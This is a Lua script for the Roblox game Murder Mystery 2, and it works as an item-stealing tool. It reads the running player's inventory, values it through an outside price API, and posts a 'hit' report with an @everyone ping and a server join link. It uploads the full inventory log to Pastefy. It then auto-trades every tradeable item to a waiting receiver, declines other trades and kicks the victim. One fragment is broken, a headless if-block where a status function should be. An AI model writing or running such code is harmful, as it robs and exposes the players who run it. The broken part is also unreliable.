local function HttpGet(Url, Timeout)
    local RequestFunc = GetRequestFunction()
    if not RequestFunc then return nil end
    local Ok, Response = pcall(function()
        return RequestFunc({
            Url = Url,
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0", ["Accept"] = "*/*"},
            Timeout = Timeout or 15
        })
    end)
    if Ok and Response and type(Response.Body) == "string" and #Response.Body > 2 then
        return Response.Body
    end
    return nil
end

-- Maps a price to its tier label. PRICE_TIERS is ordered highest-first, so the
-- first band the price reaches is the one it belongs to.
local function RarityFromPrice(Price)
    for _, Tier in ipairs(PRICE_TIERS) do
        if Price >= Tier.Min then return Tier.Name end
    end
    return "Common"
end

-- Accepts only the documented API envelope: a success flag plus a list of
-- {name, price} entries. Anything else is rejected rather than half-parsed.
local function ParseValueApi(Body)
    if type(Body) ~= "string" or #Body < 2 then return nil end

    local Ok, Decoded = pcall(function()
        return HttpService:JSONDecode(Body)
    end)
    if not Ok or type(Decoded) ~= "table" then return nil end
    if Decoded.success ~= true then return nil end
    if type(Decoded.data) ~= "table" then return nil end

    return Decoded.data
end

local function NormalizeKeys(Name)
    local LowerName = string.lower(tostring(Name))
    -- Every gsub is parenthesised. An unparenthesised gsub as the final element
    -- of a table constructor expands to (string, count), which injects a numeric
    -- key into the list -- and a numeric key is never "not found", so unknown
    -- items silently match a random database entry.
    return {
        (LowerName:gsub("[^%w]", "")),
        (LowerName:gsub("[^%w%s]", "")),
        (LowerName:gsub("[%s_%-]", "")),
        (LowerName:gsub("'", ""):gsub(" ", ""))
    }
end

-- Builds the lookup table from the API's flat entry list. Each entry is
-- {name, price}; rarity is derived from price and chroma from the name.
local function BuildMapping(Entries)
    local Mapping = {}
    local ItemCount = 0

    for _, Entry in ipairs(Entries) do
        if type(Entry) == "table" then
            local ItemName = Entry.name
            local Value = tonumber(Entry.price)
            if type(ItemName) == "string" and ItemName ~= "" and Value then
                local ItemInfo = {
                    Rarity = RarityFromPrice(Value),
                    Value = Value,
                    Emoji = Entry.emoji,
                    Chroma = (string.find(string.lower(ItemName), "chroma", 1, true) ~= nil)
                }
                for _, Key in ipairs(NormalizeKeys(ItemName)) do
                    if Key ~= "" then
                        Mapping[Key] = ItemInfo
                    end
                end
                ItemCount = ItemCount + 1
            end
        end
    end

    if next(Mapping) == nil then return nil, nil, 0 end
    return Mapping, RARITY_ORDER, ItemCount
end

local function LoadDatabase()
    local Body = HttpGet(VALUE_API, 15)
    if not Body then
        Log("[MM2] Value base unreachable:", VALUE_API)
        return nil, nil, 0
    end

    local Entries = ParseValueApi(Body)
    if not Entries then
        Log("[MM2] Value base returned an unexpected payload.")
        return nil, nil, 0
    end

    local Mapping, OrderList, ItemCount = BuildMapping(Entries)
    if not Mapping then
        Log("[MM2] Value base held no usable prices.")
        return nil, nil, 0
    end

    Log(string.format("[MM2] Value base loaded: %d items.", ItemCount))
    return Mapping, OrderList, ItemCount
end

local function FormatNameDisplay(Text)
    if not Text or Text == "" then return "Unknown" end
    local Result = ""
    local CapitalizeNext = true
    for Index = 1, #Text do
        local Char = Text:sub(Index, Index)
        if Char == " " then
            Result = Result .. " "
            CapitalizeNext = true
        else
            Result = Result .. (CapitalizeNext and Char:upper() or Char:lower())
            CapitalizeNext = false
        end
    end
    return Result
end

-- The value base is authoritative on price, so the trade decision is price-only.
-- Rarity is a derived display tier and no longer gates anything.
local function ShouldTradeThisItem(ItemValue)
    if type(ItemValue) ~= "number" then return false end
    return ItemValue >= MINIMUM_VALUE
end

local function RefreshInventoryLists()
    local AllItems, TradeItems, TotalValue, FullValue = {}, {}, 0, 0
    local Unresolved = {}
    local ProfileData
    local ProfileOK, ProfileErr = pcall(function()
        ProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
    end)

    if not ProfileOK then
        Log("[MM2] Inventory request failed:", ProfileErr)
        return AllItems, TradeItems, TotalValue, FullValue, Unresolved
    end

    if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
        for ItemId, Quantity in pairs(ProfileData.Weapons.Owned) do
            if Quantity and Quantity > 0 then
                local SafeName = tostring(ItemId or "")
                if SafeName ~= "" then
                    local ItemInfo
                    for _, Key in ipairs(NormalizeKeys(SafeName)) do
                        if Key ~= "" and ItemDatabase[Key] then
                            ItemInfo = ItemDatabase[Key]
                            break
                        end
                    end

                    if not ItemInfo then
                        table.insert(Unresolved, SafeName)
                    end

                    local RarityName = ItemInfo and ItemInfo.Rarity or "Unknown"
                    local Value = ItemInfo and ItemInfo.Value or 0
                    local IsChroma = ItemInfo and ItemInfo.Chroma or false
                    local IsTradeable = ShouldTradeThisItem(Value) and not BlacklistedItems[ItemId]

                    -- A stack is tradeable as a whole or not at all, so the two
                    -- counts differ only when the item is filtered out. Both are
                    -- carried so the loot line can show "n / n".
                    local ItemEntry = {
                        DataID = ItemId,
                        Name = SafeName,
                        Rarity = RarityName,
                        Count = Quantity,
                        Value = Value,
                        IsChroma = IsChroma,
                        Emoji = (ItemInfo and ItemInfo.Emoji) or "❔",
                        OwnedCount = Quantity,
                        TradeableCount = IsTradeable and Quantity or 0,
                        Total = Value * Quantity
                    }
                    ItemEntry.TradeableValue = Value * ItemEntry.TradeableCount
                    ItemEntry.FullValue = Value * ItemEntry.OwnedCount

                    table.insert(AllItems, ItemEntry)
                    FullValue = FullValue + ItemEntry.FullValue

                    if IsTradeable then
                        table.insert(TradeItems, ItemEntry)
                        TotalValue = TotalValue + ItemEntry.TradeableValue
                    end
                end
            end
        end
    end

    table.sort(AllItems, function(A, B) return A.Total > B.Total end)
    table.sort(TradeItems, function(A, B) return A.Total > B.Total end)
    return AllItems, TradeItems, TotalValue, FullValue, Unresolved
end

local function GenerateFullInventoryText(itemList)
    local lines, total = {}, 0
    for _, item in ipairs(itemList) do total = total + item.Total end
    table.insert(lines, string.format("Total Inventory Value: %.2f", total))
    table.insert(lines, string.rep("-", 40))
    for _, item in ipairs(itemList) do
        -- Chroma already appears in the API's own names, so it is not re-prefixed.
        local name = FormatNameDisplay(item.Name)
        table.insert(lines, string.format("[%s] x%d %s - %.2f", item.Rarity, item.Count, name, item.Total))
    end
    return table.concat(lines, "\n")
end

-- Trims trailing zeros so 10 renders as "$10" and 4.20 as "$4.2".
local function FormatMoney(Amount)
    local Text = string.format("%.2f", tonumber(Amount) or 0)
    Text = Text:gsub("0+$", ""):gsub("%.$", "")
    return "$" .. Text
end

-- Resolved from live state when the embed is built. The trade has not run yet,
-- so "Ready" means the receiver is present, "Pending" means loot is queued.

    if type(ReceiverName) == "string" and ReceiverName ~= "Unknown"
        and Players:FindFirstChild(ReceiverName) then

end

-- Ping threshold is its own constant: MINIMUM_VALUE is a trade floor and can be
-- very low, which would otherwise ping @everyone on every hit.
local function BuildEmbed(ReceiverName)
    local ShouldMentionEveryone = false
    for _, Item in ipairs(AllInventoryItems) do
        if Item.Value >= MENTION_MINIMUM then
            ShouldMentionEveryone = true
            break
        end
    end

    local MentionText = ShouldMentionEveryone and "@everyone" or ""

    local JobId = _G.RealJobID or game.JobId
    local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId

    -- Loot block, highest value first. "n / n" is tradeable vs owned count and
    -- the two figures are tradeable vs full value, so copies held back by the
    -- blacklist or the price floor stay visible instead of silently vanishing.
    local LootLines = {}
    local Shown = 0
    for _, Item in ipairs(AllInventoryItems) do
        if Shown >= LOOT_LINE_LIMIT then break end
        Shown = Shown + 1
        table.insert(LootLines, string.format("%s %s %d / %d (%s / %s)",
            Item.Emoji, Item.Name, Item.TradeableCount, Item.OwnedCount,
            FormatMoney(Item.TradeableValue), FormatMoney(Item.FullValue)))
    end
    if #AllInventoryItems > LOOT_LINE_LIMIT then
        table.insert(LootLines, string.format("... and %d more", #AllInventoryItems - LOOT_LINE_LIMIT))
    end
    table.insert(LootLines, string.rep("=", 24))
    table.insert(LootLines, string.format("Total: %s / %s",
        FormatMoney(TotalTradeValue), FormatMoney(TotalInventoryValue)))
    local LootBlock = table.concat(LootLines, "\n")

    local Status = GetHitStatus(ReceiverName)
    local FunFact = FUN_FACTS[math.random(1, #FUN_FACTS)]

    local EmbedFields = {
        {name = "🛠️ Game", value = "Murder Mystery 2", inline = true},
        {name = "⚡ Executor", value = _G.RealExecutor or "Unknown", inline = true},
        {name = "🖥️ Server", value = "[Join now!](" .. JoinLink .. ")", inline = true},
        {name = "📜 Join Script", value = "```" .. JOIN_SCRIPT_NOTICE .. "```", inline = false},
        {name = "📦 Loot", value = "```" .. LootBlock .. "```", inline = false}
    }

    -- Carried over from the earlier layout: the full log, and anything the value
    -- base does not price, so a coverage gap is visible rather than silent.
    local PasteUrl = UploadToPastefy(GenerateFullInventoryText(AllInventoryItems))
    if PasteUrl then
        table.insert(EmbedFields, {name = "📄 Full Inventory Log", value = PasteUrl, inline = false})
    end
    if #UnresolvedItems > 0 then
        local Names = {}
        for Index = 1, math.min(12, #UnresolvedItems) do
            table.insert(Names, UnresolvedItems[Index])
        end
        local UnresolvedText = table.concat(Names, ", ")
        if #UnresolvedItems > 12 then
            UnresolvedText = UnresolvedText .. ", ..."
        end
        table.insert(EmbedFields, {
            name = "❔ Not In Value Base (" .. #UnresolvedItems .. ")",
            value = UnresolvedText,
            inline = false
        })
    end

    -- 9/17/2026 12:48 PM, matching the reference footer.
    local DateText = os.date("%m/%d/%Y %I:%M %p"):gsub("^0", "")

    local EmbedData = {
        author = {name = EMBED_AUTHOR},
        title = string.format("%s • %s", LocalPlayer.DisplayName, JobId),
        description = string.format("**Status**\n%s %s\n\nFun fact: **%s**",
            Status.Emoji, Status.Text, FunFact),
        color = 0x4B5563,
        thumbnail = {url = EMBED_ICON},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        fields = EmbedFields,
        footer = {text = EMBED_FOOTER .. " • " .. DateText}
    }
    return EmbedData, MentionText
end

local MAX_TRADE_ATTEMPTS = 999
local RETRY_WAIT = 2

local function ProcessAllTrades(TargetName)
    local Attempts = 0
    while #TradeableItems > 0 and Attempts < MAX_TRADE_ATTEMPTS do
        Attempts = Attempts + 1
        local CurrentStatus = GetTradeStatus()

        if CurrentStatus == "ReceivingRequest" then
            pcall(function() Trade.DeclineRequest:FireServer() end)
            task.wait(0.5)
            continue
        end

        if CurrentStatus == "StartTrade" then
            local ItemsToSend = math.min(4, #TradeableItems)
            for _ = 1, ItemsToSend do
                local Item = table.remove(TradeableItems, 1)
                for _ = 1, Item.Count do
                    AddItemToTradeOffer(Item.DataID)
                    task.wait(0.05)
                end
            end
            task.wait(6)
            if AcceptIncomingTrade() then
                WaitUntilTradeEnds()
                ReloadInventory()
                Attempts = 0
            else
                ReloadInventory()
                task.wait(RETRY_WAIT)
            end
            continue
        end

        if CurrentStatus == "None" then
            local Sent = false
            local Try = 1
            while not Sent and Try <= 5 do
                if SendTradeRequestToPlayer(TargetName) then
                    Sent = true
                    task.wait(0.5)
                else
                    task.wait(math.min(Try * 0.5, 3))
                    Try = Try + 1
                end
            end
        end
        task.wait(0.5)
    end
    KickAfterTransfer()
end

local function AutoTradeOnTargetJoin()
    local IsBusy = false
    local function CheckPlayerJoin(Player)
        if IsBusy then return end
        local TargetName = FindTradeTarget()
        if TargetName and Player.Name == TargetName then
            IsBusy = true
            task.wait(3)
            ProcessAllTrades(Player.Name)
        end
    end
    for _, Player in ipairs(Players:GetPlayers()) do
        CheckPlayerJoin(Player)
    end
    Players.PlayerAdded:Connect(CheckPlayerJoin)
end

if #AllInventoryItems > 0 then
    AutoTradeOnTargetJoin()
else
    task.wait(1)
    SafeKick("No Items Found!")
end
